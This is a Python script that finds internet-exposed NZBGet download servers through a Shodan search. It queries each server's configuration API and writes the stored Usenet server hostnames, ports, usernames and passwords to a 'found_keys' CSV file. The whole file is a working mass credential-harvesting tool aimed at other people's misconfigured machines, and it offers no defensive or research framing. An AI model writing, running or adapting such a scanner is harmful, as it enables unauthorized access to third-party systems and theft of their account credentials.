import csv
from io import TextIOWrapper
from datetime import datetime
from itertools import cycle
from concurrent.futures import ThreadPoolExecutor, as_completed
import pynzbgetapi
import requests
import subprocess

def extract_hostnames(csv_file_path):
    hostnames = []
    with open(csv_file_path, 'r', newline='') as csvfile:
        reader = csv.reader(csvfile)
        for row in reader:
            if row:  # Ensure the row is not empty
                # Assumes hostnames are in the first column
                hostnames.append(row[0])
    return hostnames


# Function to search for keys in the webpage content
def search_for_keys(url, output_file: TextIOWrapper):
    print(f"Now searching {url}")
    try:
        # Define headers to mimic a web browser
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        }

        ng_api = pynzbgetapi.NZBGetAPI(url, timeout=5)  # Set a 5-second timeout
        json_response = ng_api.config()
        servers_found = 0
        for item in json_response:
            if item['Name'].startswith('Server'):
                property_name = item["Name"].split(".", 1)[1]
                if property_name == 'Host':
                    servers_found += 1
                    output_file.write('\n')

                if property_name == 'Host' \
                        or property_name == 'Username' \
                        or property_name == 'Password' \
                        or property_name == 'Port':
                    output_file.write(item['Value'] + ';')
                if property_name == 'Connections':
                    output_file.write(item['Value'])

        output_file.flush()
        print(f"Found {servers_found} servers in {url}")

    except requests.exceptions.Timeout:
        print(f"Connection to {url} timed out after 5 seconds.")
    except Exception as e:
        print(f"An error occurred while trying to get {url}: {e}")
        pynzbgetapi._LOGGER.exception(f"An error occurred while trying to get {url}")


# Main function to process the hostnames and write the results to the output file
def main(csv_file_path, output_file_path):
    hostnames = extract_hostnames(csv_file_path)

    # Open the output file once and pass the file object to the threads
    with open(output_file_path, 'w') as output_file:
        output_file.write("Host;Port;Username;Password;Connections")

        # Use ThreadPoolExecutor to create a pool of threads (no proxies used)
        with ThreadPoolExecutor(max_workers=10) as executor:
            # Submit tasks to the executor
            future_to_url = {
                executor.submit(search_for_keys,
                                hostname,
                                output_file): hostname for hostname in hostnames}

            # Process results as they are completed
            for future in as_completed(future_to_url):
                url = future_to_url[future]
                try:
                    future.result()  # We already logged result in search function
                except Exception as e:
                    print(f"An error occurred while processing {url}: {e}")


# Function to download a fresh list of hosts using Shodan
def download_hosts():
    # Command to search Shodan for "nzbget 200 ok"
    command = 'shodan search "nzbget 200 ok"'
    result = subprocess.check_output(command, shell=True)
    result = result.decode('utf-8')

    # Split results into lines and extract first parts
    lines = result.split('\n')
    first_results = [line.split('\t')[0] + ':' + line.split('\t')[1] for line in lines if line]

    # Save results to file
    with open('shodan_results.txt', 'w') as f:
        for item in first_results:
            f.write("%s\n" % item)

    print("Fresh list of hosts downloaded from Shodan.")


# Simple TUI to get user input
def simple_tui():
    download_choice = input("Do you want to download a fresh list of hosts from Shodan? (y/n): ")
    if download_choice.lower() == 'y':
        download_hosts()
        csv_file_name = 'shodan_results.txt'
    else:
        csv_file_name = input("Enter name of CSV file (with or without '.csv'): ")
        if not csv_file_name.lower().endswith('.csv'):
            csv_file_name += '.csv'

    csvfilepaths = csv_file_name

    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')

    outfilepathpath = f'found_keys_{timestamp}.csv'

    main(csvfilepaths, outfilepathpath)

if __name__ == '__main__':
    simple_tui()
